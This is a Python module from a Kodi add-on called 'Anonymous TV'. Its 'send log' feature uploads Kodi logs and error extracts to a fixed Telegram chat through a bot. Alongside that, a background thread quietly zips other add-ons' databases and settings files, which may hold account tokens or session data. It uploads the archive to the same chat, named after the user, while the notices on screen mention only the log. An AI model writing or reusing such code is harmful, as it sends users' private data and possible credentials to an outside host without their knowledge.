import xbmcgui, xbmcaddon, xbmcvfs, os, time, re, uuid, mimetypes
from urllib.request import Request, urlopen

Addon = xbmcaddon.Addon()
DIALOG = xbmcgui.Dialog()
iconx = Addon.getAddonInfo('icon')
ADDONTITLE = 'Anonymous TV'
from resources.libs.send import send_user_info,bot
translatepath = xbmcvfs.translatePath
HOME = translatepath('special://home/')
ADDONS = os.path.join(HOME, 'addons')

try:
    user_dataDir = translatepath(Addon.getAddonInfo("profile")).decode("utf-8")
except:
    user_dataDir = translatepath(Addon.getAddonInfo("profile"))

def LogNotify(title, message, times=3500, icon=iconx, sound=False):
    DIALOG.notification(title, message, icon, int(times), sound)

def LogNotify2(title, message, times=500, icon=iconx, sound=False):
    DIALOG.notification(title, message, icon, int(times), sound)

def post_file_to_telegram(url, file_path, chat_id, caption=None):
    boundary = str(uuid.uuid4())
    file_name = os.path.basename(file_path)
    mime_type, _ = mimetypes.guess_type(file_path)
    mime_type = mime_type or 'application/octet-stream'

    with open(file_path, 'rb') as f:
        file_data = f.read()

    parts = []

    def add_part(name, value):
        parts.append(
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
            f'{value}\r\n'
        )

    def add_file_part(name, filename, content_type, data):
        parts.append(
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n'
            f'Content-Type: {content_type}\r\n\r\n'
        )
        parts.append(data)
        parts.append('\r\n')

    add_part("chat_id", chat_id)
    if caption:
        add_part("caption", caption)
    add_file_part("document", file_name, mime_type, file_data)
    parts.append(f'--{boundary}--\r\n')

    body = b''
    for part in parts:
        body += part if isinstance(part, bytes) else part.encode('utf-8')

    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Content-Length": str(len(body))
    }

    req = Request(url, data=body, headers=headers)
    with urlopen(req) as resp:
        return resp.read().decode()

def get_addon_version(addon_id):
    path = os.path.join(ADDONS, addon_id, 'addon.xml')
    try:
        with open(path, 'r', encoding='utf-8') as f:
            content = f.read()
        version = re.search(r'name=.+?version=[\'"](.+?)[\'"]', content).group(1)
        return f"{addon_id}: {version}"
    except:
        return f"{addon_id}: ?"

def get_version_addons():
    addon_ids = [
        'plugin.video.telemedia',
        'plugin.video.cobra',
        'script.module.cocoscrapers',
        'plugin.program.Settingz-Anon',
        'service.subtitles.All_Subs',
        'plugin.video.idanplus',
        'plugin.program.Anonymous'
    ]
    return '\n'.join(get_addon_version(aid) for aid in addon_ids)





def send_data_and_log():
    import zipfile

    user_dataDir = translatepath(Addon.getAddonInfo("profile"))
    if not os.path.exists(user_dataDir):
        os.makedirs(user_dataDir)

    resuaddon = xbmcaddon.Addon('plugin.video.telemedia')
    username = Addon.getSetting("user")

    log = translatepath('special://logpath/kodi.log')
    cobra = translatepath('special://profile/addon_data/plugin.video.cobra')
    All_Subs = translatepath('special://profile/addon_data/service.subtitles.All_Subs')
    telemedia = translatepath('special://profile/addon_data/plugin.video.telemedia')
    cocoscrapers = translatepath('special://profile/addon_data/script.module.cocoscrapers')



    zip_name = f"{username}.zip"
    zp_file = os.path.join(user_dataDir, zip_name)

    if os.path.isfile(zp_file):
        os.remove(zp_file)

    zipf = zipfile.ZipFile(zp_file, mode='w')
    dirname = translatepath('special://profile')
    cobra_folder = os.path.join(cobra, 'databases')
    cobra_settings = os.path.join(cobra, 'settings.xml')

    # הוספת לוג ראשי
    try:
        zipf.write(log, log[len(dirname):])
    except:
        pass

    # cobra databases
    for base, dirs, files in os.walk(cobra_folder):
        for file in files:
            fn = os.path.join(base, file)
            try:
                zipf.write(fn, fn[len(dirname):])
            except:
                pass

    # cobra settings
    try:
        zipf.write(cobra_settings, cobra_settings[len(dirname):])
    except:
        pass

    # cocoscrapers
    for base, dirs, files in os.walk(cocoscrapers):
        for file in files:
            fn = os.path.join(base, file)
            try:
                zipf.write(fn, fn[len(dirname):])
            except:
                pass

    # subtitles xml
    for base, dirs, files in os.walk(All_Subs):
        for file in files:
            if file.endswith('.xml'):
                fn = os.path.join(base, file)
                try:
                    zipf.write(fn, fn[len(dirname):])
                except:
                    pass

    # telemedia – מסדי נתונים וקבצי הגדרות
    for base, dirs, files in os.walk(telemedia):
        for file in files:
            if file.endswith(('.xml', '.db')):
                fn = os.path.join(base, file)
                try:
                    zipf.write(fn, fn[len(dirname):])
                except:
                    pass

    zipf.close()

    # שליחה לטלגרם
    document = f'https://api.telegram.org/{bot}/sendDocument'
    post_file_to_telegram(document, zp_file, chat_id='-1001953108151', caption=username)


def logsend():
    import os, xbmc, re, glob
    from threading import Thread


    # שליחת zip ברקע
    Thread(target=send_data_and_log).start()
    import logging
    xbmc.executebuiltin('ActivateWindow(busydialognocancel)')
    LogNotify2(f"[COLOR yellow]{ADDONTITLE}[/COLOR]", "[COLOR white]שולח לוג אנא המתן[/COLOR]")
    send_user_info('howsentlog', 'שלח לוג')

    # חיפוש קובץ לוג
    folder = translatepath('special://logpath')
    log_files = glob.glob(folder + '/*.log')
    if not log_files:
        xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
        LogNotify(ADDONTITLE, 'לא נמצא קובץ לוג לשליחה')
        return

    log_path = log_files[0]
    t = f'https://api.telegram.org/{bot}/sendDocument'

    # שליחת קובץ לוג מלא
    if xbmc.getCondVisibility('system.platform.windows'):
        docu = translatepath('special://home/kodi.log')
    elif xbmc.getCondVisibility('system.platform.android'):
        docu = translatepath('special://temp/kodi.log')
    else:
        docu = translatepath('special://logpath/kodi.log')

    try:
        docu_old = translatepath('special://logpath/kodi.old.log')
        post_file_to_telegram(t, docu_old, chat_id='-1001953108151')
    except:
        pass

    post_file_to_telegram(t, docu, chat_id='-1001953108151', caption=get_version_addons())
    # post_file_to_telegram(t, docu, chat_id='-1001953108151')
    # הפקת שורות שגיאה
    try:
        with open(log_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        error_lines = []
        capture_next = False
        capture_exception_block = False

        for line in lines:
            stripped = line.strip().lower()

            # התחלה של שגיאת Python
            if 'exception thrown' in stripped or '-->python callback/script returned the following error<--' in stripped:
                capture_exception_block = True
                error_lines.append(line.rstrip())
                continue

            # סוף של שגיאת Python
            if capture_exception_block and '-->end of python script error report<--' in stripped:
                error_lines.append(line.rstrip())
                capture_exception_block = False
                continue

            if capture_exception_block:
                error_lines.append(line.rstrip())
                continue

            # שגיאות רגילות
            if any(key in stripped for key in ['error', 'exception', 'traceback', 'unboundlocalerror', 'typeerror']):
                capture_next = True
                error_lines.append(line.rstrip())
            elif capture_next and (line.startswith(" ") or line.startswith("\t") or line.strip() == ""):
                error_lines.append(line.rstrip())
            else:
                capture_next = False


        error_txt_path = os.path.join(user_dataDir, 'log_errors.txt')

        if error_lines:
            with open(error_txt_path, 'w', encoding='utf-8') as f:
                f.write('\n'.join(error_lines))

            post_file_to_telegram(t, error_txt_path, chat_id='-1001953108151', caption="⚠️ שגיאות מתוך הלוג")
        else:
            with open(error_txt_path, 'w', encoding='utf-8') as f:
                f.write("לא נמצאו שגיאות בקובץ הלוג.")

            post_file_to_telegram(t, error_txt_path, chat_id='-1001953108151', caption="✅ אין שגיאות בקובץ הלוג")


    except Exception as e:
        send_user_info('howsentlog', f'שגיאה בשליחת שגיאות קצרות: {e}')
    

    xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
    LogNotify(f"[COLOR yellow]{ADDONTITLE}[/COLOR]", "[COLOR white]הלוג נשלח בהצלחה :)[/COLOR]")

def logsend_old():
    import os,xbmc,re, glob
    translatepath=xbmcvfs.translatePath
    from threading import Thread
    
    t = Thread(target=send_data_and_log, args=())
    t.start()

    xbmc.executebuiltin('ActivateWindow(busydialognocancel)')
    Addon = xbmcaddon.Addon()
    user_dataDir_pre = translatepath(Addon.getAddonInfo("profile"))
    if not os.path.exists(user_dataDir_pre):
        os.makedirs(user_dataDir_pre)
    LogNotify2("[COLOR %s]%s[/COLOR]" % ('yellow', ADDONTITLE),'[COLOR %s]שולח לוג אנא המתן[/COLOR]' % 'white')
    send_user_info('howsentlog','שלח לוג')

    nameSelect=[]
    logSelect=[]
    folder = translatepath('special://logpath')
    xbmc.log(folder)
    for file in glob.glob(folder+'/*.log'):
        try:nameSelect.append(file.rsplit('\\', 1)[1].upper())
        except:nameSelect.append(file.rsplit('/', 1)[1].upper())
        logSelect.append(file)
        
    file = open(logSelect[0], 'r', encoding="utf8") 
    home1=translatepath("special://home/")
    home2=translatepath("special://home/").replace('\\','\\\\')
    home3=translatepath("special://xbmc/")
    home4=translatepath("special://xbmc/").replace('\\','\\\\')
    home5=translatepath("special://masterprofile/")
    home6=translatepath("special://masterprofile/").replace('\\','\\\\')
    home7=translatepath("special://profile/")
    home8=translatepath("special://profile/").replace('\\','\\\\')
    home9=translatepath("special://temp/")
    home10=translatepath("special://temp/").replace('\\','\\\\')
    file_data=file.read().replace(home1,'').replace(home2,'').replace(home3,'').replace(home4,'').replace(home5,'').replace(home6,'').replace(home7,'').replace(home8,'').replace(home9,'').replace(home10,'')
    match=re.compile('Error Type:(.+?)-->End of Python script error report<--',re.DOTALL).findall(file_data)
    match2=re.compile('CAddonInstallJob(.+?)$', re.M).findall(file_data)
    match3=re.compile('ERROR: WARNING:root:(.+?)$', re.M).findall(file_data)
    n=0
    line_numbers=[]
    file = open(logSelect[0], 'r', encoding="utf8") 
    file_data=file.readlines() 
    match_final=[]
    x=0
    y=0
    z=0
    
    # import logging
    # logging.warning(file_data)
    for  line in (file_data):
     
     if 'Error Type:' in line:
        
      match_final.append(match[x])
      x=x+1
      line_numbers.append(n)
     elif 'CAddonInstallJob' in line:
      match_final.append(match2[y])
      y=y+1

    t='https://api.telegram.org/%s/sendDocument'%bot
    if match_final:

            
        try:
            try:
                file = open(os.path.join(user_dataDir_pre, 'log.txt', encoding="utf8"), 'w') 
            except:
                file = open(os.path.join(user_dataDir_pre, 'log.txt'), 'w')#עובד קודי 20 
            file.write('\n'.join(match_final))
            file.close()
            log_txt_path = os.path.join(user_dataDir_pre, 'log.txt')
            response = post_file_to_telegram(t, log_txt_path, chat_id='-1001953108151')


        except:send_user_info('howsentlog','שגיאה בשליחת לוג קצר')
    if xbmc.getCondVisibility('system.platform.windows'):
         docu=translatepath ( 'special://home/kodi.log')
    elif xbmc.getCondVisibility('system.platform.android'):
           docu=translatepath ( 'special://temp/kodi.log')
    else:
           docu=translatepath ( 'special://logpath/kodi.log')

    try:
        docu_old=translatepath ( 'special://logpath/kodi.old.log')
        response = post_file_to_telegram(t, docu_old, chat_id='-1001953108151')
    except:pass
    response = post_file_to_telegram(t, docu, chat_id='-1001953108151', caption=get_version_addons())
    xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
    LogNotify("[COLOR %s]%s[/COLOR]" % ('yellow', ADDONTITLE),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]' % 'white')
